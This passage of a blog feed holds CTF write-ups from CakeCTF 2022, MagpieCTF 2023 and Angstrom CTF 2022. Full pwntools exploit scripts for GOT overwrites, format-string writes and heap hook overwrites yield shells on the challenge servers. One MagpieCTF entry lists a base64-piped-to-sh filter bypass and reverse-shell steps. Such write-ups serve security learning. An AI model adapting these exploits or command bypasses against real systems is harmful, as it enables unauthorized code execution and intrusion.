<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>In C++, string are dynamically allocated in the heap. So, it will appear as a pointer in the stack</p>
<p>There is a struct <code>Test</code> Exists in the stack and Program allow us to modify both <code>c_str</code> and <code>str</code>.</p>
<p>Therefore we can overwrite the address of <code>_str</code> using <code>_c_str</code>, and then we have a write anywhere.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char _c_str[0x20];</span><br><span class="line">std::string _str;</span><br></pre></td></tr></table></figure>

<p>Program is parial RELRO, therefore we can overwrite a function in GOT to <code>win</code> fucntion and get a shell.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private:</span><br><span class="line">  __attribute__((used))</span><br><span class="line">  void call_me() &#123;</span><br><span class="line">    std::system(&quot;/bin/sh&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>one thing to notice is C++ will replace last <code>\n</code> to a null bytes - make sure do not put extra bytes that may have effect on other data we don&#39;t want modify.</p>
<h1 id="0x3-Solution"><a href="#0x3-Solution" class="headerlink" title="0x3 Solution"></a>0x3 Solution</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">&quot;chall&quot;</span>)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;libc.so.6&quot;)</span></span><br><span class="line"><span class="comment"># ld = ELF(&quot;./ld-2.27.so&quot;)</span></span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log_print</span>(<span class="params">*msg</span>):</span><br><span class="line">    log.info(<span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,msg)))</span><br><span class="line">lp = log_print</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.R2:</span><br><span class="line">            <span class="built_in">input</span>(<span class="string">&quot;Wait r2 attach&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">&quot;pwn1.2022.cakectf.com&quot;</span>, <span class="number">9003</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;str: &quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;c_str: &quot;</span>,flat(&#123;</span><br><span class="line">    <span class="number">0x20</span>:<span class="number">0x00404028</span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;str: &quot;</span>,<span class="string">b&#x27;\xde\x16\x40\x00\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;str: &quot;</span>,flat(&#123;</span><br><span class="line">    <span class="number">0x20</span>: <span class="number">0x0404a00</span>,</span><br><span class="line">    <span class="number">0x28</span>: <span class="number">8</span>,</span><br><span class="line">    <span class="number">0x40</span>:<span class="number">0</span></span><br><span class="line">&#125;,length=<span class="number">0x50</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;str: &quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>MagpieCTF 2023 Writeup</title>
    <url>/ctf-writeup/2023/magpiectf/writeup/index.html</url>
    <content><![CDATA[<h1 id="0x0-Before-all"><a href="#0x0-Before-all" class="headerlink" title="0x0 Before all"></a>0x0 Before all</h1><p>I don&#39;t like this ctf. And most of challenge is not worth to craft a writeup.</p>
<p>all files can be found in <a href="https://github.com/infosec-ucalgary/magpieCTF-2023">https://github.com/infosec-ucalgary/magpieCTF-2023</a></p>
<h1 id="0x1-PWN-no-password-here"><a href="#0x1-PWN-no-password-here" class="headerlink" title="0x1 [PWN] no-password-here"></a>0x1 [PWN] no-password-here</h1><p><a href="https://github.com/infosec-ucalgary/magpieCTF-2023/tree/main/challenges/binary-exploitation/no-password-here">files</a></p>
<p><code>scanf(&quot;%s&quot;)</code> buffer overflow</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char Test[20];</span><br><span class="line">... </span><br><span class="line">char input[20];</span><br><span class="line">...</span><br><span class="line">//Check password</span><br><span class="line">if (strncmp(Test,input,20) == 0)</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure>

<p>payload: <code>&#39;A&#39;*40</code></p>
<p>flag: <code>magpie&#123;5c4nf_n07_54f3&#125;</code></p>
<h1 id="0x2-PWN-no-password-here"><a href="#0x2-PWN-no-password-here" class="headerlink" title="0x2 [PWN] no-password-here"></a>0x2 [PWN] no-password-here</h1><p><a href="https://github.com/infosec-ucalgary/magpieCTF-2023/tree/main/challenges/binary-exploitation/this-outta-be-large-enough-right">files</a></p>
<p>ret2win. fill stack with 56 + 4 padding. then overwrite eip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void win()&#123;</span><br><span class="line">    printf(&quot;Here is your flag:\n&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br><span class="line">void vuln()&#123;</span><br><span class="line">  char buf[56];</span><br><span class="line">  gets(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag: <code>magpie&#123;0mn1_fl4g_3v3rywh3r3&#125;</code></p>
<h1 id="0x3-Web-education-comes-first"><a href="#0x3-Web-education-comes-first" class="headerlink" title="0x3 [Web] education-comes-first"></a>0x3 [Web] education-comes-first</h1><p><a href="https://github.com/infosec-ucalgary/magpieCTF-2023/tree/main/challenges/web-exploitation/education-comes-first">files</a></p>
<p>call <code>hex2a</code> in web console</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hex2a(&#x27;6d61677069657b57335f525f5337314c4c5f483352337d&#x27;)</span><br></pre></td></tr></table></figure>

<p>flag: <code>magpie&#123;W3_R_S71LL_H3R3&#125;</code></p>
<h1 id="0x4-Forensic-there-is-no-flag"><a href="#0x4-Forensic-there-is-no-flag" class="headerlink" title="0x4 [Forensic] there-is-no-flag"></a>0x4 [Forensic] there-is-no-flag</h1><p><a href="https://github.com/infosec-ucalgary/magpieCTF-2023/tree/main/challenges/forensics/there-is-no-flag">files</a></p>
<ol>
<li>binwalk to extract Flag.PNG</li>
<li>recover modify png header</li>
<li>read flag</li>
</ol>
<p>flag: <code>magpie&#123;m15510n_c0mpl373_w17h_r35p3c7&#125;</code></p>
<h1 id="0x5-Network-eavesdropper"><a href="#0x5-Network-eavesdropper" class="headerlink" title="0x5 [Network] eavesdropper"></a>0x5 [Network] eavesdropper</h1><p><a href="https://github.com/infosec-ucalgary/magpieCTF-2023/tree/main/challenges/networks/eavesdropper">files</a></p>
<ol>
<li>open .pcapng file</li>
<li>find http request with largest request body, flag is in the http body</li>
</ol>
<p>flag: <code>magpie&#123;chOc0LatE_Ch1p_c0Ok1e5&#125;</code></p>
<h1 id="0x5-Network-knock-knock-anyone-there"><a href="#0x5-Network-knock-knock-anyone-there" class="headerlink" title="0x5 [Network] knock-knock-anyone-there"></a>0x5 [Network] knock-knock-anyone-there</h1><ol>
<li>bypass waf using <code>printf cmd_in_base_64 | base64 -d | sh</code></li>
<li>setting up reverse shell</li>
<li>find password of user sappheiros using <code>cat /opt/backup/*</code> (<code>5up32_53cu23_p455w02d123</code>)</li>
<li><code>su sappheiros</code></li>
<li>first half flag is in <code>cat /home/sappheiros/message.txt</code></li>
<li><code>tcpdump -nnA host 172.16.238.30</code></li>
<li>second half flag is hidden inside ids of icmp packets.</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">pcap = rdpcap(&#x27;dump.pcap&#x27;)</span><br><span class="line"></span><br><span class="line">data = [p[ICMP] for p in pcap if ICMP in p]</span><br><span class="line"></span><br><span class="line">print(b&#x27;&#x27;.join([bytes([d.id]) for d in data]).split(b&#x27;&#125;&#x27;))</span><br></pre></td></tr></table></figure>

<p>flag: <code>magpie&#123;y0u_h4v3_7h3_p0w32_70_54v3_7h3_w021d&#125;</code></p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] caniride [Angstrom CTF 2022]</title>
    <url>/ctf-writeup/2022/angstrom/pwn/caniride/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>We&#39;ve developed a direct competitor to Uber, using blockchain technology.</p>
<p>nc challs.actf.co 31228</p>
<p>Author: JoshDaBosh</p>
<p>files: <a href="caniride">caniride</a>, <a href="libc.so.6">libc.so.6</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>


<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>todo</p>
<p>in simple word, use this bug to leak binary base address using <code>obj.__dso_handle</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (4 &lt; var_440h) &#123;</span><br><span class="line">       sym.imp.puts(&quot;Not enough drivers! Sorry.&quot;);</span><br><span class="line">       sym.imp.exit(1);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>Then use <code>printf(&quot;%*d&quot;, width, num)</code> to write data</p>
<p>in this case, <code>%&#123;num&#125;$0*&#123;value_offset&#125;$d%&#123;addr_offset&#125;$hn</code></p>
<ol>
<li>leak libc, return to main</li>
<li>write rip to one_gadget, get shell</li>
</ol>
<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">&quot;./caniride_patched&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">ld = ELF(<span class="string">&quot;./ld-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log_print</span>(<span class="params">*msg</span>):</span><br><span class="line">    log.info(<span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,msg)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.R2:</span><br><span class="line">            <span class="built_in">input</span>(<span class="string">&quot;Wait r2 attach&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">&quot;challs.actf.co&quot;</span>, <span class="number">31228</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lp = log_print</span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">leak_offset = (exe.symbols[<span class="string">&quot;__dso_handle&quot;</span>] - exe.symbols[<span class="string">&quot;drivers&quot;</span>]) // <span class="number">8</span></span><br><span class="line"></span><br><span class="line">got_exit_0 = (((<span class="number">0x7ffeb326e300</span> - <span class="number">0x3f0</span>) - <span class="number">0x7ffeb326dec0</span>) // <span class="number">8</span>) + <span class="number">6</span></span><br><span class="line">got_exit_1 = got_exit_0 + <span class="number">1</span></span><br><span class="line">got_exit_2 = got_exit_0 + <span class="number">2</span></span><br><span class="line">val_0 = got_exit_0+<span class="number">3</span></span><br><span class="line">main_addr_0 =got_exit_0 + <span class="number">4</span></span><br><span class="line">main_addr_1 =got_exit_0 + <span class="number">5</span></span><br><span class="line">main_addr_2 =got_exit_0 + <span class="number">6</span></span><br><span class="line"></span><br><span class="line">printf_payload = <span class="string">f&quot;%<span class="subst">&#123;val_0&#125;</span>$0*<span class="subst">&#123;main_addr_0&#125;</span>$d%<span class="subst">&#123;got_exit_0&#125;</span>$hn%<span class="subst">&#123;val_0&#125;</span>$0*<span class="subst">&#123;main_addr_1&#125;</span>$d%<span class="subst">&#123;got_exit_1&#125;</span>$hn%<span class="subst">&#123;val_0&#125;</span>$0*<span class="subst">&#123;main_addr_2&#125;</span>$d%<span class="subst">&#123;got_exit_2&#125;</span>$hn&quot;</span></span><br><span class="line">lp(<span class="string">&quot;printf payload&quot;</span>,printf_payload)</span><br><span class="line">io.sendafter(<span class="string">b&quot;Name: &quot;</span>,flat(&#123;<span class="number">0</span>:[printf_payload.encode()]&#125;,length=<span class="number">49</span>,filler=<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;driver: &quot;</span>,<span class="built_in">str</span>(leak_offset).encode())</span><br><span class="line">io.recvuntil(<span class="string">b&quot;this is &quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">int</span>.from_bytes(io.recvuntil(<span class="string">b&quot; your driver&quot;</span>,drop=<span class="literal">True</span>),<span class="string">&quot;little&quot;</span>)</span><br><span class="line">exe.address = leak_addr - exe.symbols[<span class="string">&quot;__dso_handle&quot;</span>]</span><br><span class="line">lp(<span class="string">&quot;got exit&quot;</span>,<span class="built_in">hex</span>(exe.got[<span class="string">&quot;exit&quot;</span>]))</span><br><span class="line">lp(<span class="built_in">hex</span>(exe.address),<span class="built_in">hex</span>(exe.symbols[<span class="string">&quot;drivers&quot;</span>]),<span class="built_in">hex</span>(exe.symbols[<span class="string">&quot;__gmon_start__&quot;</span>]))</span><br><span class="line">addr_x = [</span><br><span class="line">    [exe.got[<span class="string">&quot;exit&quot;</span>]+<span class="number">0</span>,exe.sym[<span class="string">&quot;main&quot;</span>] &amp; <span class="number">0xffff</span>],</span><br><span class="line">    [exe.got[<span class="string">&quot;exit&quot;</span>]+<span class="number">2</span>,(exe.sym[<span class="string">&quot;main&quot;</span>] &gt;&gt; (<span class="number">8</span>*<span class="number">2</span>)) &amp; <span class="number">0xffff</span>],</span><br><span class="line">    [exe.got[<span class="string">&quot;exit&quot;</span>]+<span class="number">4</span>,(exe.sym[<span class="string">&quot;main&quot;</span>] &gt;&gt; (<span class="number">8</span>*<span class="number">4</span>)) &amp; <span class="number">0xffff</span>],</span><br><span class="line">]</span><br><span class="line">lp(<span class="string">&quot;main addr&quot;</span>,<span class="built_in">hex</span>(exe.sym[<span class="string">&quot;main&quot;</span>]))</span><br><span class="line">addr_x.sort(key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line">io.sendafter(<span class="string">b&quot;yourself: &quot;</span>,flat(&#123;</span><br><span class="line">    <span class="number">0</span>:[i[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> addr_x] + [<span class="number">0</span>] + [</span><br><span class="line">        addr_x[<span class="number">0</span>][<span class="number">1</span>],</span><br><span class="line">        addr_x[<span class="number">1</span>][<span class="number">1</span>] - addr_x[<span class="number">0</span>][<span class="number">1</span>],</span><br><span class="line">        addr_x[<span class="number">2</span>][<span class="number">1</span>] - addr_x[<span class="number">1</span>][<span class="number">1</span>]</span><br><span class="line">        ]</span><br><span class="line">&#125;))</span><br><span class="line">leak_libc =  ((<span class="number">0x7ffeb28748c8</span> - <span class="number">0x7ffeb2874030</span>)  // <span class="number">8</span>) + <span class="number">6</span></span><br><span class="line">printf_payload_2 = <span class="string">f&quot;%<span class="subst">&#123;leak_libc&#125;</span>$pENDL&quot;</span></span><br><span class="line">lp(<span class="string">&quot;leak libc payload&quot;</span>,printf_payload_2)</span><br><span class="line">io.sendafter(<span class="string">b&quot;Name: &quot;</span>,printf_payload_2.encode().ljust(<span class="number">49</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;driver: &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&quot;yourself: &quot;</span>,<span class="string">b&#x27;abc&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Bye, &quot;</span>)</span><br><span class="line">tmp = io.recvuntil(<span class="string">b&quot;ENDL&quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">lp(<span class="string">&quot;libc start main return&quot;</span>,tmp)</span><br><span class="line">libc.address = <span class="built_in">int</span>(tmp,<span class="number">16</span>) - libc.libc_start_main_return</span><br><span class="line">lp(<span class="string">&quot;libc base addr&quot;</span>,<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget = libc.address+<span class="number">0xe3b31</span> <span class="comment"># r15 == NULL &amp; rdx == NULL</span></span><br><span class="line">lp(<span class="string">&quot;one gadget addr&quot;</span>,<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">printf_payload = <span class="string">f&quot;%<span class="subst">&#123;val_0&#125;</span>$0*<span class="subst">&#123;main_addr_0&#125;</span>$d%<span class="subst">&#123;got_exit_0&#125;</span>$hn%<span class="subst">&#123;val_0&#125;</span>$0*<span class="subst">&#123;main_addr_1&#125;</span>$d%<span class="subst">&#123;got_exit_1&#125;</span>$hn%<span class="subst">&#123;val_0&#125;</span>$0*<span class="subst">&#123;main_addr_2&#125;</span>$d%<span class="subst">&#123;got_exit_2&#125;</span>$hn&quot;</span></span><br><span class="line">lp(<span class="string">&quot;printf payload&quot;</span>,printf_payload)</span><br><span class="line">io.sendafter(<span class="string">b&quot;Name: &quot;</span>,printf_payload.encode().ljust(<span class="number">49</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;driver: &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">addr_x = [</span><br><span class="line">    [exe.got[<span class="string">&quot;exit&quot;</span>]+<span class="number">0</span>,one_gadget &amp; <span class="number">0xffff</span>],</span><br><span class="line">    [exe.got[<span class="string">&quot;exit&quot;</span>]+<span class="number">2</span>,(one_gadget &gt;&gt; (<span class="number">8</span>*<span class="number">2</span>)) &amp; <span class="number">0xffff</span>],</span><br><span class="line">    [exe.got[<span class="string">&quot;exit&quot;</span>]+<span class="number">4</span>,(one_gadget &gt;&gt; (<span class="number">8</span>*<span class="number">4</span>)) &amp; <span class="number">0xffff</span>],</span><br><span class="line">]</span><br><span class="line">addr_x.sort(key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;yourself: &quot;</span>,flat(&#123;</span><br><span class="line">    <span class="number">0</span>:[i[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> addr_x] + [<span class="number">0</span>] + [</span><br><span class="line">        addr_x[<span class="number">0</span>][<span class="number">1</span>],</span><br><span class="line">        addr_x[<span class="number">1</span>][<span class="number">1</span>] - addr_x[<span class="number">0</span>][<span class="number">1</span>],</span><br><span class="line">        addr_x[<span class="number">2</span>][<span class="number">1</span>] - addr_x[<span class="number">1</span>][<span class="number">1</span>]</span><br><span class="line">        ]</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>actf{h0llerin&#39;_at_y0u_from_a_1977_mont3_car1o_a6ececa9966d}</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] dreams [Angstrom CTF 2022]</title>
    <url>/ctf-writeup/2022/angstrom/pwn/dreams/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Sometimes I want to just stay in my dreams.</p>
<p>I heard this helps: libc.so.6.</p>
<p>nc challs.actf.co 31227</p>
<p>Author: JoshDaBosh</p>
<p>files: <a href="dreams">dreams</a>, <a href="libc.so.6">libc.so.6</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>


<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>todo</p>
<p>heap problem.</p>
<p>using pointer stored in the freed heap, point next heap to of the <code>obj.dreams</code>.</p>
<p>Then, change one address in <code>obj.dreams</code> to <code>__free_hook</code>. overwrite <code>__free_hook</code> to <code>system</code>.</p>
<p><code>free(&quot;/bin/sh&quot;)</code> to get shell.</p>
<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">&quot;dreams_patched&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&quot;./ld-2.27.so&quot;)</span></span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log_print</span>(<span class="params">*msg</span>):</span><br><span class="line">    log.info(<span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,msg)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.R2:</span><br><span class="line">            <span class="built_in">input</span>(<span class="string">&quot;Wait r2 attach&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">&quot;challs.actf.co&quot;</span>, <span class="number">31227</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sleep</span>(<span class="params">io,slot,date,dream</span>):</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;this dream? &quot;</span>,<span class="built_in">str</span>(slot).encode())</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;(mm/dd/yy))?&quot;</span>,flat(&#123;<span class="number">0</span>:[date]&#125;,length=<span class="number">0x8</span>,filler=<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;dream about? &quot;</span>,flat(&#123;<span class="number">0</span>:[dream]&#125;,length=<span class="number">0x14</span>,filler=<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sell</span>(<span class="params">io,slot</span>):</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;trading in?&quot;</span>,<span class="built_in">str</span>(slot).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Get out of here.\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit</span>(<span class="params">io,slot,date</span>):</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;trouble?&quot;</span>,<span class="built_in">str</span>(slot).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;that &#x27;</span>)</span><br><span class="line">    bs = io.recvuntil(<span class="string">b&#x27;\nDue&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;New date: &quot;</span>,flat(&#123;<span class="number">0</span>:[date]&#125;,length=<span class="number">0x8</span>,filler=<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> bs</span><br><span class="line"></span><br><span class="line">sleep(io,<span class="number">0</span>,<span class="string">&quot;AAAA&quot;</span>,<span class="string">&quot;BBBB&quot;</span>)</span><br><span class="line">sleep(io,<span class="number">1</span>,<span class="string">&quot;AAAA&quot;</span>,<span class="string">&quot;BBBB&quot;</span>)</span><br><span class="line">sell(io,<span class="number">0</span>)</span><br><span class="line">sell(io,<span class="number">1</span>)</span><br><span class="line">top_pointer = <span class="built_in">int</span>.from_bytes(visit(io,<span class="number">1</span>,exe.symbols[<span class="string">&quot;dreams&quot;</span>]),<span class="string">&quot;little&quot;</span>)</span><br><span class="line">log_print(<span class="string">&quot;top_pointer&quot;</span>,<span class="built_in">hex</span>(top_pointer))</span><br><span class="line">sleep(io,<span class="number">2</span>,exe.got[<span class="string">&quot;printf&quot;</span>]-<span class="number">8</span>,exe.symbols[<span class="string">&quot;MAX_DREAMS&quot;</span>])</span><br><span class="line">sleep(io,<span class="number">3</span>,top_pointer + <span class="number">0x1300</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x14</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>.from_bytes(visit(io,<span class="number">0</span>,<span class="number">0</span>),<span class="string">&quot;little&quot;</span>) - libc.sym[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">visit(io,<span class="number">1</span>,<span class="number">0x1337</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base_addr&quot;</span>,<span class="built_in">hex</span>(libc.address))</span><br><span class="line">sleep(io,<span class="number">20</span>,<span class="string">&quot;AAAA&quot;</span>, <span class="number">0</span>)</span><br><span class="line">sleep(io,<span class="number">22</span>,<span class="string">&quot;AAAA&quot;</span>,<span class="number">0</span>)</span><br><span class="line">sell(io,<span class="number">20</span>)</span><br><span class="line">sell(io,<span class="number">22</span>)</span><br><span class="line">visit(io,<span class="number">22</span>,exe.symbols[<span class="string">&quot;dreams&quot;</span>])</span><br><span class="line">sleep(io,<span class="number">10</span>, libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>],<span class="number">0</span>)</span><br><span class="line">sleep(io,<span class="number">14</span>, top_pointer + <span class="number">0x1360</span>,<span class="number">0</span>)</span><br><span class="line">visit(io,<span class="number">0</span>,libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">sleep(io,<span class="number">1</span>,<span class="string">&quot;/bin/sh&quot;</span>,<span class="number">0</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;trading in?&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

